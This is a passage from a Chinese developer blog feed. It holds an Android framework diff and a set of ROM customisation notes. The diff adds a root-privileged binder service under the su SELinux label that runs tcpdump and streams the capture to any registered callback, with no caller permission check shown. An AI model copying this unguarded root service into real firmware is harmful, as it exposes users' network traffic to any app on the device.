class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/core/java/android/app/customapi/root/Android.mk b/core/java/android/app/customapi/root/Android.mk</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..de9b35ecc3b</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/customapi/root/Android.mk</span><br><span class="line">@@ -0,0 +1,60 @@</span><br><span class="line">+LOCAL_PATH:= $(call my-dir)</span><br><span class="line">+include $(CLEAR_VARS)</span><br><span class="line">+LOCAL_PACKAGE_NAME := RootApiService</span><br><span class="line">+LOCAL_CFLAGS += -Wno-unused-parameter</span><br><span class="line">+LOCAL_MODULE_TAGS := optional</span><br><span class="line">+LOCAL_MODULE := librootapiservice</span><br><span class="line">+</span><br><span class="line">+LOCAL_C_INCLUDES := \</span><br><span class="line">+    $(LOCAL_PATH) \</span><br><span class="line">+</span><br><span class="line">+LOCAL_EXPORT_C_INCLUDE_DIRS := \</span><br><span class="line">+    $(LOCAL_PATH) \</span><br><span class="line">+</span><br><span class="line">+LOCAL_AIDL_INCLUDES := \</span><br><span class="line">+    $(LOCAL_PATH)/aidl \</span><br><span class="line">+</span><br><span class="line">+LOCAL_SRC_FILES := \</span><br><span class="line">+    aidl/android/app/customapi/root/jar/IRootApiService.aidl \</span><br><span class="line">+    aidl/android/app/customapi/root/jar/IRootApiServiceCallback.aidl \</span><br><span class="line">+    RootApiService.cpp</span><br><span class="line">+</span><br><span class="line">+LOCAL_SHARED_LIBRARIES := \</span><br><span class="line">+    libutils \</span><br><span class="line">+    libbinder \</span><br><span class="line">+    liblog     </span><br><span class="line">+</span><br><span class="line">+LOCAL_INIT_RC := rootapi_service.rc</span><br><span class="line">+</span><br><span class="line">+include $(BUILD_SHARED_LIBRARY)</span><br><span class="line">+</span><br><span class="line">+include $(CLEAR_VARS)</span><br><span class="line">+LOCAL_PACKAGE_NAME := RootApiService</span><br><span class="line">+LOCAL_MODULE_TAGS := optional</span><br><span class="line">+LOCAL_MODULE := rootapi_service </span><br><span class="line">+</span><br><span class="line">+LOCAL_SRC_FILES := \</span><br><span class="line">+    main_RootApiService.cpp</span><br><span class="line">+</span><br><span class="line">+LOCAL_SHARED_LIBRARIES := \</span><br><span class="line">+    libutils \</span><br><span class="line">+    libbinder \</span><br><span class="line">+    liblog\</span><br><span class="line">+librootapiservice</span><br><span class="line">+</span><br><span class="line">+include $(BUILD_EXECUTABLE)</span><br><span class="line">+</span><br><span class="line">diff --git a/core/java/android/app/customapi/root/RootApiService.cpp b/core/java/android/app/customapi/root/RootApiService.cpp</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..20432886708</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/customapi/root/RootApiService.cpp</span><br><span class="line">@@ -0,0 +1,121 @@</span><br><span class="line">+#define LOG_TAG &quot;Root Service&quot;</span><br><span class="line">+#include &quot;RootApiService.h&quot;</span><br><span class="line">+#include &lt;unistd.h&gt;</span><br><span class="line">+#include &lt;stdio.h&gt;</span><br><span class="line">+</span><br><span class="line">+#include &lt;iostream&gt;</span><br><span class="line">+#include &lt;thread&gt;</span><br><span class="line">+#include &lt;fstream&gt;</span><br><span class="line">+</span><br><span class="line">+using namespace android;</span><br><span class="line">+ </span><br><span class="line">+namespace android &#123;</span><br><span class="line">+namespace app &#123;</span><br><span class="line">+namespace customapi &#123;</span><br><span class="line">+namespace root &#123;</span><br><span class="line">+namespace jar &#123;</span><br><span class="line">+ </span><br><span class="line">+void RootApiService::onFirstRef()&#123;</span><br><span class="line">+    // ALOGD(&quot;onFirstRef()&quot;);</span><br><span class="line">+&#125;</span><br><span class="line">+ </span><br><span class="line">+RootApiService::RootApiService()&#123;</span><br><span class="line">+    // ALOGD(&quot;RootApiService()&quot;);</span><br><span class="line">+&#125;</span><br><span class="line">+ </span><br><span class="line">+RootApiService::~RootApiService()&#123;</span><br><span class="line">+    // ALOGD(&quot;~RootApiService()&quot;);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+binder::Status RootApiService::executeCommand(int time) &#123;</span><br><span class="line">+   </span><br><span class="line">+    int pipefd[2];</span><br><span class="line">+    if (pipe(pipefd) == -1) &#123;</span><br><span class="line">+        perror(&quot;pipe&quot;);</span><br><span class="line">+        return binder::Status::fromServiceSpecificError(1);</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    pid_t childPid = fork();</span><br><span class="line">+    if (childPid == -1) &#123;</span><br><span class="line">+        perror(&quot;fork&quot;);</span><br><span class="line">+        return binder::Status::fromServiceSpecificError(1);</span><br><span class="line">+    &#125; else if (childPid == 0) &#123; // 子进程</span><br><span class="line">+        ALOGD(&quot;childPid = %d&quot;, childPid);</span><br><span class="line">+        close(pipefd[0]); // 关闭读端</span><br><span class="line">+</span><br><span class="line">+        // 将标准输出重定向到管道的写端</span><br><span class="line">+        dup2(pipefd[1], STDOUT_FILENO);</span><br><span class="line">+        close(pipefd[1]); // 关闭多余的文件描述符</span><br><span class="line">+</span><br><span class="line">+        char command[100];</span><br><span class="line">+        snprintf(command, sizeof(command), &quot;timeout %d tcpdump&quot;, time);</span><br><span class="line">+        ALOGD(&quot;command = %s&quot;, command);</span><br><span class="line">+        std::thread captureThread([command]() &#123;</span><br><span class="line">+            system(command);</span><br><span class="line">+        &#125;);</span><br><span class="line">+        captureThread.join(); </span><br><span class="line">+        ALOGD(&quot;captureThread end&quot;);</span><br><span class="line">+        // 关闭写端</span><br><span class="line">+        close(STDOUT_FILENO);</span><br><span class="line">+    &#125; else &#123; // 父进程</span><br><span class="line">+        ALOGD(&quot;childPid = %d&quot;, childPid);</span><br><span class="line">+        close(pipefd[1]); // 关闭写端</span><br><span class="line">+        // 在当前线程中循环读取输出并进行处理</span><br><span class="line">+        std::thread printThread([&amp;pipefd, childPid, this]() &#123;</span><br><span class="line">+            char buffer[4096];</span><br><span class="line">+            ssize_t bytesRead;</span><br><span class="line">+            while (true) &#123;</span><br><span class="line">+                bytesRead = read(pipefd[0], buffer, sizeof(buffer));</span><br><span class="line">+                ALOGD(&quot;bytesRead = %d&quot;, bytesRead);</span><br><span class="line">+                if (bytesRead &gt; 0) &#123;</span><br><span class="line">+                    // 处理每次读取的数据</span><br><span class="line">+                    std::string line(buffer, bytesRead);</span><br><span class="line">+                    notifyMessage(String16(line.c_str()));</span><br><span class="line">+                &#125; else if (bytesRead == 0) &#123;</span><br><span class="line">+                    ALOGD(&quot;read end&quot;);</span><br><span class="line">+                    break;</span><br><span class="line">+                &#125; else &#123;</span><br><span class="line">+                    perror(&quot;read&quot;);</span><br><span class="line">+                    break;</span><br><span class="line">+                &#125;</span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125;);</span><br><span class="line">+        printThread.join(); // 分离线程，让其在后台运行</span><br><span class="line">+        ALOGD(&quot;All threads finished&quot;);</span><br><span class="line">+    &#125;</span><br><span class="line">+    ALOGD(&quot;executeCommand end&quot;);</span><br><span class="line">+    return binder::Status::ok();</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+binder::Status RootApiService::registerCallback(const sp&lt;IRootApiServiceCallback&gt;&amp; callback)&#123;</span><br><span class="line">+    ALOGD(&quot;service::registerCallback&quot;);</span><br><span class="line">+    if(callback == NULL)&#123;</span><br><span class="line">+        ALOGD(&quot;registerListener == null&quot;);</span><br><span class="line">+        return binder::Status::fromServiceSpecificError(1);</span><br><span class="line">+    &#125;</span><br><span class="line">+    mCallback = callback;</span><br><span class="line">+    return binder::Status::ok();</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+binder::Status RootApiService::unregisterCallback(const sp&lt;IRootApiServiceCallback&gt;&amp; callback)&#123;</span><br><span class="line">+    ALOGD(&quot;service::unregisterCallback&quot;);</span><br><span class="line">+    mCallback = NULL;</span><br><span class="line">+    return binder::Status::ok();</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+binder::Status RootApiService::notifyMessage(const String16&amp; msg)&#123;</span><br><span class="line">+    if(mCallback == NULL)&#123;</span><br><span class="line">+        ALOGD(&quot;mCallback == null&quot;);</span><br><span class="line">+        return binder::Status::fromServiceSpecificError(1);</span><br><span class="line">+    &#125;</span><br><span class="line">+    mCallback-&gt;onCommandCompleted(200, msg);</span><br><span class="line">+    ALOGD(&quot;callback::callBack end&quot;);</span><br><span class="line">+    return binder::Status::ok();</span><br><span class="line">+&#125;</span><br><span class="line">+&#125;</span><br><span class="line">+&#125;</span><br><span class="line">+&#125;</span><br><span class="line">+&#125;</span><br><span class="line">+&#125;</span><br><span class="line">\ No newline at end of file</span><br><span class="line">diff --git a/core/java/android/app/customapi/root/RootApiService.h b/core/java/android/app/customapi/root/RootApiService.h</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..0d57a4b559d</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/customapi/root/RootApiService.h</span><br><span class="line">@@ -0,0 +1,34 @@</span><br><span class="line">+#include &lt;android/app/customapi/root/jar/BnRootApiService.h&gt;</span><br><span class="line">+#include &lt;android/app/customapi/root/jar/BnRootApiServiceCallback.h&gt;</span><br><span class="line">+#include &lt;binder/BinderService.h&gt;</span><br><span class="line">+</span><br><span class="line">+namespace android &#123;</span><br><span class="line">+namespace app &#123;</span><br><span class="line">+namespace customapi &#123;</span><br><span class="line">+namespace root &#123;</span><br><span class="line">+namespace jar &#123;</span><br><span class="line">+class RootApiService : </span><br><span class="line">+    public ::android::BinderService&lt;RootApiService&gt;,</span><br><span class="line">+    public BnRootApiService&#123;</span><br><span class="line">+friend class BinderService&lt;RootApiService&gt;;</span><br><span class="line">+</span><br><span class="line">+public:</span><br><span class="line">+    RootApiService();</span><br><span class="line">+    ~RootApiService();</span><br><span class="line">+    static const String16  getServiceName() &#123; return String16(&quot;rootservice&quot;); &#125;</span><br><span class="line">+    binder::Status executeCommand(int time) override;</span><br><span class="line">+    binder::Status registerCallback(const sp&lt;IRootApiServiceCallback&gt;&amp; callback) override;</span><br><span class="line">+    binder::Status unregisterCallback(const sp&lt;IRootApiServiceCallback&gt;&amp; callback) override;</span><br><span class="line">+    binder::Status notifyMessage(const String16&amp; msg) override;</span><br><span class="line">+    virtual void onFirstRef();</span><br><span class="line">+ </span><br><span class="line">+private:</span><br><span class="line">+    sp&lt;IRootApiServiceCallback&gt; mCallback;</span><br><span class="line">+&#125;;</span><br><span class="line">+</span><br><span class="line">+&#125;</span><br><span class="line">+&#125;</span><br><span class="line">+&#125;</span><br><span class="line">+&#125;</span><br><span class="line">+&#125;</span><br><span class="line">+ </span><br><span class="line">diff --git a/core/java/android/app/customapi/root/aidl/android/app/customapi/root/jar/IRootApiService.aidl b/core/java/android/app/customapi/root/aidl/android/app/customapi/root/jar/IRootApiService.aidl</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..335e90d27c7</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/customapi/root/aidl/android/app/customapi/root/jar/IRootApiService.aidl</span><br><span class="line">@@ -0,0 +1,9 @@</span><br><span class="line">+package android.app.customapi.root.jar;</span><br><span class="line">+import android.app.customapi.root.jar.IRootApiServiceCallback;</span><br><span class="line">+ </span><br><span class="line">+interface IRootApiService&#123;</span><br><span class="line">+    void executeCommand(int time);</span><br><span class="line">+    void registerCallback(IRootApiServiceCallback callback);</span><br><span class="line">+    void unregisterCallback(IRootApiServiceCallback callback);</span><br><span class="line">+    oneway void notifyMessage(in String msg);</span><br><span class="line">+&#125;</span><br><span class="line">\ No newline at end of file</span><br><span class="line">diff --git a/core/java/android/app/customapi/root/aidl/android/app/customapi/root/jar/IRootApiServiceCallback.aidl b/core/java/android/app/customapi/root/aidl/android/app/customapi/root/jar/IRootApiServiceCallback.aidl</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..5a6d980ab7b</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/customapi/root/aidl/android/app/customapi/root/jar/IRootApiServiceCallback.aidl</span><br><span class="line">@@ -0,0 +1,5 @@</span><br><span class="line">+package android.app.customapi.root.jar;</span><br><span class="line">+ </span><br><span class="line">+interface IRootApiServiceCallback&#123;</span><br><span class="line">+    oneway void onCommandCompleted(int status, String msg);</span><br><span class="line">+&#125;</span><br><span class="line">\ No newline at end of file</span><br><span class="line">diff --git a/core/java/android/app/customapi/root/jar/Android.mk b/core/java/android/app/customapi/root/jar/Android.mk</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..3acaa41b9fd</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/customapi/root/jar/Android.mk</span><br><span class="line">@@ -0,0 +1,21 @@</span><br><span class="line">+LOCAL_PATH:= $(call my-dir)</span><br><span class="line">+</span><br><span class="line">+include $(CLEAR_VARS)</span><br><span class="line">+</span><br><span class="line">+LOCAL_MODULE_TAGS := optional</span><br><span class="line">+LOCAL_MODULE := RootApiService</span><br><span class="line">+LOCAL_PRIVATE_PLATFORM_APIS := true</span><br><span class="line">+LOCAL_CERTIFICATE := platform</span><br><span class="line">+</span><br><span class="line">+LOCAL_AIDL_INCLUDES := \</span><br><span class="line">+    $(LOCAL_PATH)/../service/aidl \</span><br><span class="line">+</span><br><span class="line">+LOCAL_SRC_FILES := \</span><br><span class="line">+IRootApiServiceCallback.aidl \</span><br><span class="line">+    IRootApiService.aidl \</span><br><span class="line">+    RootServiceManager.java</span><br><span class="line">+</span><br><span class="line">+LOCAL_STATIC_JAVA_LIBRARIES += \</span><br><span class="line">+</span><br><span class="line">+LOCAL_JACK_ENABLED := disabled</span><br><span class="line">+include $(BUILD_STATIC_JAVA_LIBRARY)</span><br><span class="line">diff --git a/core/java/android/app/customapi/root/jar/IRootApiService.aidl b/core/java/android/app/customapi/root/jar/IRootApiService.aidl</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..335e90d27c7</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/customapi/root/jar/IRootApiService.aidl</span><br><span class="line">@@ -0,0 +1,9 @@</span><br><span class="line">+package android.app.customapi.root.jar;</span><br><span class="line">+import android.app.customapi.root.jar.IRootApiServiceCallback;</span><br><span class="line">+ </span><br><span class="line">+interface IRootApiService&#123;</span><br><span class="line">+    void executeCommand(int time);</span><br><span class="line">+    void registerCallback(IRootApiServiceCallback callback);</span><br><span class="line">+    void unregisterCallback(IRootApiServiceCallback callback);</span><br><span class="line">+    oneway void notifyMessage(in String msg);</span><br><span class="line">+&#125;</span><br><span class="line">\ No newline at end of file</span><br><span class="line">diff --git a/core/java/android/app/customapi/root/jar/IRootApiServiceCallback.aidl b/core/java/android/app/customapi/root/jar/IRootApiServiceCallback.aidl</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..5a6d980ab7b</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/customapi/root/jar/IRootApiServiceCallback.aidl</span><br><span class="line">@@ -0,0 +1,5 @@</span><br><span class="line">+package android.app.customapi.root.jar;</span><br><span class="line">+ </span><br><span class="line">+interface IRootApiServiceCallback&#123;</span><br><span class="line">+    oneway void onCommandCompleted(int status, String msg);</span><br><span class="line">+&#125;</span><br><span class="line">\ No newline at end of file</span><br><span class="line">diff --git a/core/java/android/app/customapi/root/jar/RootServiceManager.java b/core/java/android/app/customapi/root/jar/RootServiceManager.java</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..fb9daca68a7</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/customapi/root/jar/RootServiceManager.java</span><br><span class="line">@@ -0,0 +1,113 @@</span><br><span class="line">+ package android.app.customapi.root.jar;</span><br><span class="line">+</span><br><span class="line">+ import android.os.IBinder;</span><br><span class="line">+ import android.os.RemoteException;</span><br><span class="line">+ import android.os.ServiceManager;</span><br><span class="line">+ import android.os.Handler;</span><br><span class="line">+ import android.os.Message;</span><br><span class="line">+ import android.os.Bundle;</span><br><span class="line">+ import android.util.Log;</span><br><span class="line">+</span><br><span class="line">+ public class RootServiceManager&#123;</span><br><span class="line">+     private static final String TAG = &quot;Root Service&quot;;</span><br><span class="line">+     private static final RootServiceManager instance = new RootServiceManager();</span><br><span class="line">+     private final Object mServiceAquireLock = new Object();</span><br><span class="line">+     private IRootApiService service = null;</span><br><span class="line">+</span><br><span class="line">+</span><br><span class="line">+     public static RootServiceManager getInstance()&#123;</span><br><span class="line">+         return instance;</span><br><span class="line">+     &#125;</span><br><span class="line">+</span><br><span class="line">+     public void executeCommand(int time)&#123;</span><br><span class="line">+         try &#123;</span><br><span class="line">+             Log.d(TAG, &quot;executeCommand&quot;);</span><br><span class="line">+             getService().executeCommand(time);</span><br><span class="line">+         &#125; catch (Throwable e) &#123;</span><br><span class="line">+             e.printStackTrace();</span><br><span class="line">+             Log.e(TAG,&quot;executeCommand &quot;+e.getMessage());</span><br><span class="line">+         &#125;</span><br><span class="line">+     &#125;</span><br><span class="line">+  </span><br><span class="line">+     public void registerCallback(IRootApiServiceCallback callback)&#123;</span><br><span class="line">+         try &#123;</span><br><span class="line">+             Log.d(TAG, &quot;registerCallback&quot;);</span><br><span class="line">+             getService().registerCallback(callback);</span><br><span class="line">+         &#125; catch (Throwable e) &#123;</span><br><span class="line">+             e.printStackTrace();</span><br><span class="line">+             Log.e(TAG,&quot;registerCallback &quot;+e.getMessage());</span><br><span class="line">+         &#125;</span><br><span class="line">+     &#125;</span><br><span class="line">+</span><br><span class="line">+     public void unregisterCallback(IRootApiServiceCallback callback)&#123;</span><br><span class="line">+         try &#123;</span><br><span class="line">+             Log.d(TAG, &quot;unregisterCallback&quot;);</span><br><span class="line">+             getService().unregisterCallback(callback);</span><br><span class="line">+         &#125; catch (Throwable e) &#123;</span><br><span class="line">+             e.printStackTrace();</span><br><span class="line">+             Log.e(TAG,&quot;unregisterCallback &quot;+e.getMessage());</span><br><span class="line">+         &#125;</span><br><span class="line">+     &#125;</span><br><span class="line">+</span><br><span class="line">+     public void notifyMessage(String msg)&#123;</span><br><span class="line">+         try &#123;</span><br><span class="line">+             Log.d(TAG, &quot;notifyMessage&quot;);</span><br><span class="line">+             getService().notifyMessage(msg);</span><br><span class="line">+         &#125; catch (Throwable e) &#123;</span><br><span class="line">+             e.printStackTrace();</span><br><span class="line">+             Log.e(TAG,&quot;notifyMessage &quot;+e.getMessage());</span><br><span class="line">+         &#125;</span><br><span class="line">+     &#125;</span><br><span class="line">+</span><br><span class="line">+     private IRootApiService getService() &#123;</span><br><span class="line">+         synchronized (mServiceAquireLock) &#123;</span><br><span class="line">+             if (service == null) &#123;</span><br><span class="line">+                 try&#123;</span><br><span class="line">+                     IBinder binder = ServiceManager.getService(&quot;rootservice&quot;);</span><br><span class="line">+                     service = IRootApiService.Stub.asInterface(binder);</span><br><span class="line">+                     service.asBinder().linkToDeath(new IBinder.DeathRecipient() &#123;</span><br><span class="line">+                         @Override</span><br><span class="line">+                         public void binderDied() &#123;</span><br><span class="line">+                             Log.d(TAG, &quot;service Died&quot;);</span><br><span class="line">+                             service.asBinder().unlinkToDeath(this, 0);</span><br><span class="line">+                             service = null;</span><br><span class="line">+                         &#125;</span><br><span class="line">+                     &#125;, 0);</span><br><span class="line">+                 &#125;catch (Throwable e)&#123;</span><br><span class="line">+                     e.printStackTrace();</span><br><span class="line">+                     Log.e(TAG,&quot;getService &quot;+e.getMessage());</span><br><span class="line">+                 &#125;</span><br><span class="line">+             &#125;</span><br><span class="line">+             return service;</span><br><span class="line">+         &#125;</span><br><span class="line">+     &#125;</span><br><span class="line">+ &#125;</span><br><span class="line">diff --git a/core/java/android/app/customapi/root/main_RootApiService.cpp b/core/java/android/app/customapi/root/main_RootApiService.cpp</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..32dfd04a4b4</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/customapi/root/main_RootApiService.cpp</span><br><span class="line">@@ -0,0 +1,27 @@</span><br><span class="line">+//参考  frameworks/av/media/mediaserver/main_mediaserver.cpp</span><br><span class="line">+#define LOG_TAG &quot;Root Service&quot;</span><br><span class="line">+ </span><br><span class="line">+#include &lt;binder/IPCThreadState.h&gt;</span><br><span class="line">+#include &lt;binder/ProcessState.h&gt;</span><br><span class="line">+#include &lt;binder/IServiceManager.h&gt;</span><br><span class="line">+#include &quot;RootApiService.h&quot;</span><br><span class="line">+ </span><br><span class="line">+using namespace android;</span><br><span class="line">+ </span><br><span class="line">+int main(void)&#123;</span><br><span class="line">+    signal(SIGPIPE, SIG_IGN);</span><br><span class="line">+    sp&lt;ProcessState&gt; proc(ProcessState::self());</span><br><span class="line">+ </span><br><span class="line">+    sp&lt;IServiceManager&gt; sm(defaultServiceManager());</span><br><span class="line">+ </span><br><span class="line">+    ALOGI(&quot;ServiceManager:addService %p&quot;, sm.get());</span><br><span class="line">+    android::app::customapi::root::jar::RootApiService::instantiate();</span><br><span class="line">+    </span><br><span class="line">+    ProcessState::self()-&gt;startThreadPool();</span><br><span class="line">+    IPCThreadState::self()-&gt;joinThreadPool();</span><br><span class="line">+ </span><br><span class="line">+    return 0;</span><br><span class="line">+&#125;</span><br><span class="line">diff --git a/core/java/android/app/customapi/root/rootapi_service.rc b/core/java/android/app/customapi/root/rootapi_service.rc</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..b917e4fac53</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/customapi/root/rootapi_service.rc</span><br><span class="line">@@ -0,0 +1,6 @@</span><br><span class="line">+service rootapi /system/bin/rootapi_service</span><br><span class="line">+    user root</span><br><span class="line">+    group root</span><br><span class="line">+    seclabel u:r:su:s0</span><br><span class="line">+    class main</span><br><span class="line">+    </span><br><span class="line">\ No newline at end of file</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安卓细碎笔记</title>
    <link href="/2023/11/05/%E5%AE%89%E5%8D%93%E7%BB%86%E7%A2%8E%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/11/05/%E5%AE%89%E5%8D%93%E7%BB%86%E7%A2%8E%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="细碎的笔记"><a href="#细碎的笔记" class="headerlink" title="细碎的笔记"></a>细碎的笔记</h2><ul><li><p>安卓中开发一般可以采用userdebug模式，但交付的时候一般是user模式。user模式可能会因为权限问题发生莫名其妙的错误。比如selinux会不给权限拒绝操作。另外还无法adb root 也就无法push apk到一些特殊的路径，比如data、system，还遇到了编译通过烧录无法开机的问题，没排查到原因，后面自己解决了，测试了多次，怀疑是注册system service的时候写在系统服务那里了，导致的系统无法启动，后面移到了很后面。 </p></li><li><p>安卓11之后修改framework源码会有强制lint检测，要求方法和参数都标注上是否可为空，还有异常的检查。这种原则上需要按照检查修改代码，不过也可以直接在frameworks&#x2F;base&#x2F;Android.bp中的 metalava_framework_docs_args 添加    “–api-lint-ignore-prefix android.app. “ + 来无视检查。 </p></li><li><p>安卓设置系统时间是需要权限的，如果是app的话保证app的uid为system ，此外还需要申请如下权限。不过我直接在源码中添加了一个system服务，以system_service用户执行，该接口可以直接修改系统时间，要用的话还是要jar包（后面就别在system里面加服务了，都是直接写一个系统权限apk来完成）。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:name=&quot;android.permission.CHANGE_CONFIGURATION&quot; /&gt;    </span><br><span class="line">&lt;uses-permission android:name=&quot;android.permission.SET_TIME_ZONE&quot; /&gt; </span><br></pre></td></tr></table></figure></li><li><p>system_service 没有读写 sdcard 的权限.在 Android11 之前，可以通过修改用户组来获得权限<code>system/core/include/private/android_filesystem_config.h</code><br>可查看权限对应的用户组, <code>frameworks/base/core/java/com/android/internal/os/ZygoteInit.java</code><code>--setgroups</code>设置用户组<br>。但Android11 之后就不行了</p></li><li><p>对外提供需要特殊权限接口，最佳做法是提供一个系统权限的APK，而不是在system_service中新增一个服务。在提供静默安装接口时尝试使用system_service用户执行，但该用户是没有读取sd卡内容的权限的，这一点很奇怪，而且不好修改权限组给它权限，尝试了一下失败了，这个和Android11的一些改变有关，sdcard的权限组发生了变化。最初方案是通过在settings中加了一个广播接收器来进行静默安装，在广播的转发过程中发现同步返回安装结果是一个大问题。<br>最后通过apk和aidl顺利解决了这个问题。在安卓源码中添加一个apk，编写好Android.mk和AndroidMainfest.xml文件，在AndroidMainfest文件中可以给应用权限，Android.mk文件可以给apk系统签名。在apk中创建一个aidl，实现它，写一个service将aidl的实现注册到ServerManager中，此时该服务就在系统中了，还需要apk接受开机广播进行自启动才能启动服务。另外apk放在packages&#x2F;apps目录下，需要在device&#x2F;rockchip&#x2F;rk356x&#x2F;device.mk中的PRODUCT_PACKAGES加上自己的应用的包名，这样烧录后会预装到system&#x2F;app目录下，可以接受开机广播，如果预装到data目录下可能无法收到开机广播也就无法自启动。在调用该服务的时候，需要将aidl文件拷贝一份，放到调用的地方下，因为客户端和服务端要保证所调用的aidl接口一致，所以客户端也需要一个完全一样aidl文件，如果不需要aidl文件，那么可以在服务端再写一个manager类，将service内置到manager中，再将manager注册到系统服务里面。自此就可以顺利通过aidl和客户端来创建接口了。</p></li><li><p>系统应用发送的广播需要加上 protected-broadcast ，不然会被阻止。 </p></li><li><p>应用A发送一个广播到应用B，发送后中断当前方法，应用B收到广播后执行相应的操作，等到操作结束后再发送广播反馈给应用A执行结果，应用A拿到执行结果后再被唤醒，继续之前的方法。这里有一个同步操作，采用synchronized 或者 CountDownLatch 中断同步方法 都会收不到A的广播，一直阻塞下去。这个问题没解决，记录一下，可能和service是单独一个子线程有关，如果有中断的同步就会出问题。</p></li><li><p>在打补丁前，为了代码和其他人员一致，便于补丁能顺利打上，一般需要先pull代码。但是在做安卓定制的时候，是基于底层给的一个补丁脚本来还原代码环境的。执行脚本前要先执行根目录下的 revert.sh，此时会将未提交的代码还原，但是代码中已经commit 是无法还原的，所以这里需要到提交的目录下使用 git reset –hard commitID 来还原代码，不然脚本会执行失败。 使用 git reset –hard 之后想要将代码还原，可以使用git reflog 查看提交日志，这里会看到git log中看不到的回滚信息。找到想要恢复的版本号之后使用 git reset –hard “id” 就可以顺利恢复文件了</p></li><li><p>串口调试路径 -&gt; TVI3356A_android12&#x2F;kernel-5.10&#x2F;arch&#x2F;arm64&#x2F;boot&#x2F;dts&#x2F;rockchip&#x2F;rk3588-android.dtsi，打开此文件，搜索 debugger 可以看到 baudrate，这个就是查看窗口的波特率。此路径下还有大量dtsi文件，首次编译时如要选电压，也是在该路径下的dtsi文件中查看， 具体是哪个 dtsi文件 可以看 kernel.sh</p></li><li><p>adb里面写入和查看framework中Setting里面Global的值的方式：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">settings get global 属性名</span><br><span class="line">settings put global 属性名</span><br></pre></td></tr></table></figure><ul><li><p>打包OTA升级包的方式： 在 .&#x2F;debug.sh脚本中 将make installclean和.&#x2F;mkimage.sh换成下面的 make dist .&#x2F;mkimage.sh 